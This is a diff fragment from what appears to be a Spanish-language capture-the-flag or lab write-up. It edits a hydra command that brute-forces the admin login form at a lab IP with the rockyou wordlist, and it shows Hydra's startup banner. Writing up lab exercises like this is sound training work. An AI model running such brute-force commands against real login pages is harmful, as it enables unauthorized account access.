@@ -127,7 +127,7 @@ Starting gobuster in directory enumeration mode
 
 - aplicamos hydra
 ```
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.192.172 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -t 64   
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.192.172 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -t 64 -f    
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-10 22:57:09
